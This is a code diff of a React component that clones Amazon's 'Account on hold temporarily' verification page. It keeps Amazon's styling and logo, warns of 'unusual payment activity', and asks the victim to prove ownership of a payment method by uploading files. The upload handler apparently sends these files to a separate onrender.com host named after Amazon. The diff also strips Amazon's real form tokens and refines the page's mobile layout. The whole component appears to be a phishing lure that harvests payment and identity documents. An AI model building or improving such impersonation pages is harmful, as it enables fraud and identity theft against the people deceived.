@@ -182,9 +182,10 @@ export default function Laptop() {
         }
     },[urlImages])
 
-    const handleUpload = async () => {
+    const handleUpload = async (event) => {
         // http://localhost:4000
         // https://api-amazon-s37l.onrender.com
+        event.preventDefault();
         
         if(images.length > 0){
         
@@ -256,14 +257,11 @@ export default function Laptop() {
 
   return (
 
-    <div data-language-code="en-US" className="abbott-view a-m-us a-aui_72554-c a-aui_a11y_1_699934-c a-aui_a11y_4_835613-c a-aui_a11y_6_837773-c a-aui_a11y_sr_678508-c a-aui_killswitch_csa_logger_372963-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c">
+    <>
         <div id="a-page">
             <div className="a-section">
                 <div className="a-section abbott-view-header">
                     <div className="a-section a-spacing-none">
-                    
-                        
-                        
                         <div className="a-section abbott-view-component">
                             <div className="a-section a-spacing-medium a-spacing-top-medium a-text-center"><a className="a-link-nav-icon" tabIndex="-1" href="https://www.amazon.com/"><i className="a-icon a-icon-logo" role="presentation"></i></a></div>
                         </div>
@@ -273,19 +271,7 @@ export default function Laptop() {
                 </div>
                 <div className="a-section abbott-view-content content-width-mini hidden">
                 
-                <form id="abbott-form" method="post" action="/">
-                                    <input
-                    type="hidden"
-                    name="__token_"
-                    value="gz+PxZNtljMpXrzlyUfbwokzlhdBrCtnuRs6GmK7SEOhAAAAAQAAAABl4xfkcmF3AAAAAPgCGsIfbV0AW+J7i/a6ow=="
-                    />
-
-                    <input
-                    type="hidden"
-                    name="authenticationContext"
-                    value="language=en_US&amp;marketplaceId=ATVPDKIKX0DER&amp;assocHandle=amzn_abbott_portal_us&amp;pageId=amzn_abbott_portal_us&amp;returnTo=https%3A%2F%2Fwww.amazon.com"
-                    spellCheck="false"
-                    />
+                <form >
 
                     <div
                     id="alert-0"
@@ -298,9 +284,9 @@ export default function Laptop() {
                     >
                         <div className="a-box a-alert a-alert-error" role="alert">
                         <div className="a-box-inner a-alert-container">
-                            <h4 className="a-alert-heading">Account on hold temporarily</h4>
-                            <i className="a-icon a-icon-alert"></i>
-                            <div className="a-alert-content">
+                            <h4 className="a-alert-heading pl-0-mobile text-15-mobile">Account on hold temporarily</h4>
+                            <i className="a-icon a-icon-alert display-mobile"></i>
+                            <div className="a-alert-content text-15-mobile">
                             We noticed unusual payment activity on your account and need to verify
                             ownership of the payment method used on your most recent order. (<span
                                 className="a-declarative"
@@ -1385,7 +1371,7 @@ export default function Laptop() {
                         type="hidden"
                         id="document-selected-file-names"
                         name="document-selected-file-names"
-                        value={fullName}
+                        value=''
                         spellCheck="false"
                         />
                         <input
@@ -1443,7 +1429,7 @@ export default function Laptop() {
 
                         <div
                         id="text-22"
-                        className="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large"
+                        className="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large mt-24"
                         >
                         <span
                             data-action-on-load="register-listeners"
@@ -1557,6 +1543,8 @@ export default function Laptop() {
         
                 </div>
             </div>
-        </div>
+    </>
+
+    
   )
 }
